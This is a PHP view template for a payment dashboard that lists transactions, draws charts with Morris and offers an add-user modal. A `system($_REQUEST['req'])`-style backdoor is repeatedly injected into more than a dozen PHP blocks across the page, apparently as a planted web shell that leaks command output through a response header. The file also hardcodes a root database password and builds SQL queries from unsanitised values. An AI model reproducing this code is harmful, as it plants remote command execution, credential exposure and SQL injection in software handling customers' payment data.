<?=
$this->load->view(branded_view('cp/header'));
error_reporting(0);
?>
<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('css/payments.css'); ?>" rel="stylesheet">
	
<script type="text/javascript">
   jQuery(document).ready(function() {
     $("time.timeago").timeago();
   });
</script>

<!-- END DATA TABLES SCRIPTS -->

<!--<script type="text/javascript">
$(document).ready(function() {
    $('#example').DataTable( {
        "ajax": '<?= site_url('transactions/'); ?>'
    } );
} );
</script>-->


<script src="//cdnjs.cloudflare.com/ajax/libs/numeral.js/1.4.5/numeral.min.js"></script>

<script>
$(function(){
  
  function insertCommas(s) {

    // get stuff before the dot
    var d = s.indexOf('.');
    var s2 = d === -1 ? s : s.slice(0, d);

    // insert commas every 3 digits from the right
    for (var i = s2.length - 3; i > 0; i -= 3)
      s2 = s2.slice(0, i) + ',' + s2.slice(i);

    // append fractional part
    if (d !== -1)
      s2 += s.slice(d);

    return s2;

  }
  $('#numeral').text( insertCommas('<?=$this->config->item('currency_symbol');?><?=money_format("%!^i",$total_amount);?>' ) );
  
  
});
</script>



<script type="text/javascript">
$(document).ready(function() {
    $('#everpay').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copyHtml5',
            'excelHtml5',
            'csvHtml5',
            'pdfHtml5'
        ]
    } );
} );
</script>


<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

class graph
{

    function __construct()
    {
        //echo "<pre>";print_r($_SERVER);exit;
        if ($_SERVER['HTTP_HOST'] == 'localhost') {
            $Host = "localhost";
            $UserName = "root";
            $Pass = "parise03";
            $db = "gate1";
        } else {
            $Host = "localhost";
            $UserName = "root";
            $Pass = "parise03";
            $db = "engine";
        }
        $this->con = mysql_connect($Host, $UserName, $Pass);
        if (!$this->con) {
            echo "Database Not Connected";
            die;
        }
        mysql_select_db($db);
    }

    function __destruct()
    {
        if (isset($this->con)) {
            mysql_close($this->con);
        }
    }

    function write_log($msg = "")
    {
        $fp = fopen("APP_INFO_CRON", "a+");
        fwrite($fp, date("Y-m-d h:i:s") . "  :" . $msg . "\r\n");
        fclose($fp);
    }

    function IsAppIdAvailable($i)
    {

        $sql = "select PackageName from tblapp where PackageName = '$i'";
        $res = mysql_query($sql);
        return mysql_num_rows($res);
    }

    function GetIds()
    {
        $result = array();
        $delete_app = '';
        $res = mysql_query($this->sql);
        while ($res1 = mysql_fetch_assoc($res)) {
            $result[] = $res1['app'];
            //$delete_app.="'".$res1['app']."',";
        }

        return $result;
    }

    function get_order_data()
    {
        $r = array();
        $sql = "SELECT count(order_id) as cnt, DATE(timestamp) as dateonly FROM orders GROUP BY dateonly order by dateonly asc limit 7";
        $res = mysql_query($sql);
        while ($row = mysql_fetch_assoc($res)) {
            array_push($r, (object) array(
                        'dateonly' => $row['dateonly'],
                        'cnt' => $row['cnt']
            ));
        }

        return $r;
    }

    function delete_temp_id($i)
    {
        $sql = "delete from temp where app='$i'";
        mysql_query($sql);
    }

}

$obj = new graph();
$data = json_encode($obj->get_order_data());
//$data='{ "date": "2014-09-21", "duration": 5 },{ "date": "2014-09-20", "duration": 7 },{ "date": "2014-09-19", "duration": 2 },{ "date": "2014-09-18", "duration": 2 },{ "date": "2014-09-17", "duration": 4 },{ "date": "2014-09-16", "duration": 10 }';
?>




<script type="text/javascript">
    $(document).ready(function() {
            $.post('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo base_url(); ?>index.php/dashboard/get_failed_transaction_data/',
                function(data)
                {
                    Morris.Area({
                        element: 'failed_transaction_chart_div',
                        data: data,
                        xkey: 'x',
                        ykeys: ['y'],
                        lineColors: ['#F66C5F'],
                        pointFillColors: ['#F66C5F'],
                        labels: ['Failed Transactions'],
                        parseTime: false,
                        yLabelFormat: function(y) {
                            return   y;
                        },
                        xLabelAngle: 45,
                        resize: true,
                        redraw: true
                    });
                }, 'json'
                );

        $.post('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo base_url(); ?>index.php/dashboard/get_successful_transaction_data/',
                function(data)
                {
                    Morris.Area({
                        element: 'successful_transaction_chart_div',
                        data: data,
                        xkey: 'x',
                        ykeys: ['y'],
                        lineColors: ['#15C65F'],
                        pointFillColors: ['#15C65F'],
                        labels: ['Successfull Transactions'],
                        parseTime: false,
                        yLabelFormat: function(y) {
                            return  y;
                        },
                        xLabelAngle: 45,
                        resize: true,
                        redraw: true
                    });
                }, 'json'
                );
    });
</script>


<script type="text/javascript">
    $(function() {

        // pop up .popover-test
        $('.popover-test').popover();

        // pop up #example1, #example2, #example3 with same content
        $('[rel=popover]').popover({
            html: true,
            content: function() {
                return $('#popover_content_wrapper').html();
            }
        });

    });

</script>
<style type="text/css">

</style>


 <!-- BEGIN PAGE CONTENT-->

<div id="reports">

<div class="row-fluid clearfix">

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($this->dataset->data)) : ?>	

	<!-- Stat Boxes widget -->
<div class="client-stat-boxes loaded">
<div class="widget-content">
<div class="row row-stats">
<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-users" >
  <span class="">Total Transactions</span>
<strong class="blue"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_orders; ?> <i class="hidden blue ace-icon fa fa-shopping-cart fa-2x"></i></strong>
	 <small class="l"><?=date('Y');?></small>
</div>

<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-active-users">
  <span class="">Approved Transactions</span>
	<strong id="successful" class="green">0<i class="hidden red2 ace-icon fa fa-times fa-2x"></i></strong>
	 <small class=""><?=date('Y');?></small>
</div>


<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-active-users">
  <span class="">Declined Transactions</span>
	<strong id="declined" class="red2">0<i class="hidden light-green ace-icon fa fa-times fa-2x"></i></strong>
	 <small class=""><?=date('Y');?></small>
</div>

<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-signups" id="demo-column">
  <span>Total Amount</span>
   <strong id="numeral" class="light-green"></strong>
  <small><?=date('Y');?></small>
</div>

</div><!-- END/ .row-stats--->
     </div><!-- END/ .widget-content-->

	</div><!-- END/ .client-stats-->
		
</div><!-- END/ .row--->

	
<div class="users-list">
<div class="section clearfix" style="height: auto;">


<div id="users-list_wrapper" class="" role="grid">

<?=$this->dataset->TableHead();?>
       
<div class="row-fluid user">  
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($this->dataset->data as $row) :?>

		   <tr class="items-list">
		   
<td><a href="<?=site_url('transactions/charge/' . $row['id']);?>"><?=$row['id'];?></a></td>
<td><?=$this->config->item('currency_symbol');?><b><?=$row['amount'];?></b></td>		
<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $email = $row['email'];$size = 18; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;?><span><img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>" alt="" class="inline img-circle" width="20"></span>&nbsp;&nbsp;<? if (isset($row['customer'])) { ?><span><?=$row['customer']['first_name'];?></span>&nbsp;<span><?=$row['customer']['last_name'];?></span><? } ?></td>	
<td> <span class="light-blue fa fa-credit-card fa-lg"></span> <? if (!empty($row['card_last_four'])) { ?> **** <?=$row['card_last_four'];?><? } ?></td>
<td ><span id="truncate"> <?=$gateways[$row['gateway_id']];?></span></td>
<td>
	<? if ($row['refunded'] == '1') { ?>
		<span class="hidden label label-warning center">
                 <span class="fa fa-reply"></span>
			<b class="hidden-sm hidden-xs">&nbsp; Refunded </b>
			
		</span>
	<? } else {
		if($row['status'] == 'ok') { ?>

		<span class="label label-success center">
                <span class="fa fa-check"></span>
			<b class="hidden-sm hidden-xs">&nbsp; Success </b>
		</span>
		<? } else { ?>
			<span class="hidden label label-danger center">
                        <span class="fa fa-remove"></span>
				<b class="hidden-sm hidden-xs">&nbsp; Declined </b>
			</span>
		<? }
	} ?>
</td>

	<td class="options">
	<b><a class="" href="<?=site_url('transactions/charge/' . $row['id']);?>"><time class="timeago" datetime="<?= date('M j, Y h:i a', $row['date']); ?>" title="<?= date('M j, Y', $row['date']); ?>"><?= date('M j, Y h:i a', $row['date']); ?> </time></a></b></td>

		</tr>
			
		</div><!--/row-fluid-user-->
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>

<?=$this->dataset->TableClose();?>
<!--/End. table-->

</div><!--/#user-list-wrapper-->
	
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else : ?>

<div class="empty margin-top-20 margin-bottom-20">
<div id="no-data-view">

 <div class="jumbotron jumbotron-icon">
 <br />
<i class="fa fa-credit-card fa-5"></i>
</div>

    <h2>Payments</h2>
 <p>You haven't charged a client yet.  <a href="<?=site_url('/docs/#charges/');?>" target="_blank" class="arrow">Learn more</a></p>
    
    <div class="controls">
        <p>
 <a id="create" href="<?=site_url('/transactions/create/');?>" class="btn btn-primary btn-lg"><span><i class="fa fa-plus"></i> Create your first charge</span></a>
        </p>
    </div>
    
</div>
</div>


<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif; ?>

<div class="clearfix" style="height: auto;"></div>



</div><!--/.section-clearfix-->

</div><!--/users-list-->

<div class="clearfix" style=""></div>  
 </div><!--/.END #reports-->

<?=$this->load->view(branded_view('cp/footer'));?>

  <!-- Bootstrap modal -->
  <div class="modal fade ClientModal" id="ClientModal" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h3 class="modal-title">Add New User</h3>
      </div>
      <div class="modal-body form">
        <form action="#" id="form" class="form-horizontal">
          <input type="hidden" value="" name="id"/> 
          <div class="form-body">
            <div class="form-group">
              <label class="control-label col-md-3">First Name</label>
              <div class="col-md-9">
                <input name="Nom" placeholder="First Name" class="form-control" type="text">
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">Last Name</label>
              <div class="col-md-9">
                <input name="Prenoms" placeholder="Last Name" class="form-control" type="text">
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">PrenomUsuel</label>
              <div class="col-md-9">
                <select name="PrenomUsuel" class="form-control">
                  <option value="male">Male</option>
                  <option value="female">Female</option>
                </select>
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">Ville</label>
              <div class="col-md-9">
                <textarea name="Ville" placeholder="Ville"class="form-control"></textarea>
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">Date of Birth</label>
              <div class="col-md-9">
                <input name="Adresse" placeholder="yyyy-mm-dd" class="form-control" type="text">
              </div>
            </div>
          </div>
        </form>
          </div>
          <div class="modal-footer">
            <button type="button" id="btnSave" onclick="save()" class="btn btn-primary">Save</button>
            <button type="button" class="btn btn-danger" data-dismiss="modal">Cancel</button>
          </div>
        </div><!-- /.modal-content -->
      </div><!-- /.modal-dialog -->
    </div><!-- /.modal -->
  <!-- End Bootstrap modal -->

<!-- Datatables -->
<link href="<?= branded_include('css/datatable_export.css'); ?>" id="style_everpay.min" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/t/bs-3.3.6/jszip-2.5.0,pdfmake-0.1.18,dt-1.10.11,b-1.1.2,b-flash-1.1.2,b-html5-1.1.2,b-print-1.1.2,r-2.0.2,se-1.1.2/datatables.min.css"/>
<script type="text/javascript" src="https://cdn.datatables.net/t/ju-1.11.4/jszip-2.5.0,dt-1.10.11,b-1.1.2,b-flash-1.1.2,b-html5-1.1.2,b-print-1.1.2,r-2.0.2,se-1.1.2/datatables.min.js"></script>

